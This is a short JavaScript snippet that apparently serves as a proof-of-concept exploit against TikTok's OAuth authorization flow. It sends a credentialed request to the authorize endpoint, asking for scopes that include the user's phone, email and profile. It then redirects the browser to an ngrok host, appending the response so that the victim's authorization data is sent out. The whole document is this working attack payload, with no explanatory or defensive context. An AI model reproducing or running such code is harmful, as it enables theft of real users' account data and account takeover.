var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("POST", "https://www.tiktok.com/v2/auth/authorize/?client_key=awn32gkr1d27lv49&redirect_uri=https%3A%2F%2Fseller-id.tiktok.com%2Faccount%2Foauth%2Ftt%2Fcallback&scope=user.info.username%2Cuser.info.basic%2Cuser.info.phone%2Cuser.info.email%2Cuser.info.profile%2Cuser.info.stats&response_type=code&state=%7B%22csrfState%22%3A%22djf9m%22%2C%22login_only%22%3A1%2C%22page_name%22%3A%22log_in%22%2C%22redirect_url%22%3A%22https%3A%2F%2Fseller-id.tiktok.com%2Fhomepage%3Fprev_page_name%3Dtts_portal%26region_check%3D1%22%2C%22url_params%22%3A%22%3Fprev_page_name%3Dtts_portal%22%7D&lang=en");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send();

function reqListener() {
    location='//b564-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
};
